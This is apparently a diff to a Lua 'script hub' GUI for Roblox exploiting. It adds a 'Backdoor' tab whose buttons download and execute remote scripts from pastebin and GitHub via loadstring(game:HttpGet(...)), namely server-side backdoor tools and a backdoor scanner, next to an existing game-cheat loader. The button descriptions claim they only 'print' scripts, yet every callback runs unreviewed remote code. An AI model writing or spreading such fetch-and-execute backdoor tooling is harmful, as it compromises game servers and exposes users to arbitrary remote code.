@@ -198,7 +198,7 @@ FE:Button {
     end
 }
 
-UNIVERSAL:Button {
+FE:Button {
     Name = "FE SCRIPT HUB 2",
     Description = "This is a button that prints a FE script",
     Callback = function()
@@ -306,5 +306,34 @@ BladeBoll:Button {
     Description = "This is a button that prints a BLADE BOLL script",
     Callback = function()
     loadstring(game:HttpGet("https://github.com/Stang001/pulawat/blob/main/BladeBall.lua?raw=true"))()
+    end
+}
+
+local Backdoor = GUI:Tab {
+    Name = "Backdoor",
+    Icon = "rbxassetid://18554329349"
+}
+
+Backdoor:Button{
+    Name = "TNT MASTER'S SS BACKDOOR",
+    Description = "This is a button that prints a backdoor script",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/hi4mDR43"))()
+    end
+}
+
+Backdoor:Button{
+    Name = "BACKDOOR.EXE V6.0",
+    Description = "This is a button that prints a backdoor script",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua'))()
+    end
+}
+
+Backdoor:Button{
+    Name = "LALOL HUB",
+    Description = "This is a button that prints a backdoor script",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
     end
 }
